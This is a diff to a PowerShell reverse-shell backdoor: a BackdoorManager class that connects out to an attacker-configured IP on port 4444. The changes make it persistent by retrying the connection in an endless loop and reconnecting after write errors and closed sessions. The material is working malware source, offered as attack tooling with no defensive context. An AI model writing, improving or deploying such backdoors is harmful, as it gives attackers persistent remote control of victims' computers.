@@ -109,33 +109,48 @@ function print_help() {
 class BackdoorManager {
     
     # !!!!  DO NOT CHANGE THIS RUN backdoor.py !!!!
-    [string]$UserDefinedIPAddress = "0.0.0.0"
+    [string]$UserDefinedIPAddress = "0.0.0.0";
     # !!!!  DO NOT CHANGE THIS RUN backdoor.py !!!!
-    [int]$UserDefinedPort = 4444
+    [int]$UserDefinedPort = 4444;
 
-    $activeStream 
-    $activeClient
-    $sessionWriter
-    $textBuffer
-    $sessionReader
-    $textEncoding
-    [int]$readCount = 50*1024
+    $activeStream;
+    $activeClient;
+    $sessionWriter;
+    $textBuffer;
+    $sessionReader;
+    $textEncoding;
+    [int]$readCount = 50*1024;
+
+    waitForConnection() {
+        $this.activeClient = $false;
+        while ($this.activeClient -eq $false) {
+            try {
+                $this.activeClient = New-Object Net.Sockets.TcpClient($this.UserDefinedIPAddress, $this.UserDefinedPort);
+            } catch [System.Net.Sockets.SocketException] {
+                $this.activeClient = $false;
+            }
+        }
+    }
 
     createBackdoorConnection() {
-        $this.activeClient = New-Object Net.Sockets.TcpClient($this.UserDefinedIPAddress, $this.UserDefinedPort);
+        $this.waitForConnection();
         $this.activeStream = $this.activeClient.GetStream();
         $this.textBuffer = New-Object Byte[] $this.readCount;
         $this.textEncoding = New-Object Text.UTF8Encoding;
         $this.sessionWriter = New-Object IO.StreamWriter($this.activeStream, [Text.Encoding]::UTF8, $this.readCount);
-        $this.sessionReader = New-Object System.IO.StreamReader($this.activeStream)
+        $this.sessionReader = New-Object System.IO.StreamReader($this.activeStream);
         $this.sessionWriter.AutoFlush = $true;
-        $this.handleActiveClient()
+        $this.handleActiveClient();
 
     }
 
     writeToStream($content) {
-        [byte[]]$bytes  = [text.Encoding]::Ascii.GetBytes($content)
-        $this.sessionWriter.Write($bytes,0,$bytes.length)     
+        try {
+            [byte[]]$bytes  = [text.Encoding]::Ascii.GetBytes($content);
+            $this.sessionWriter.Write($bytes,0,$bytes.length);   
+        } catch [System.Management.Automation.MethodInvocationException] {
+            $this.createBackdoorConnection();
+        }
     }
 
     handleActiveClient() {
@@ -175,7 +190,8 @@ class BackdoorManager {
             $this.activeStream.Flush()
         }
             $this.activeClient.Close()
-    }     
+        $this.createBackdoorConnection();
+    } 
 }
 
 $backdoor = [BackdoorManager]::new()
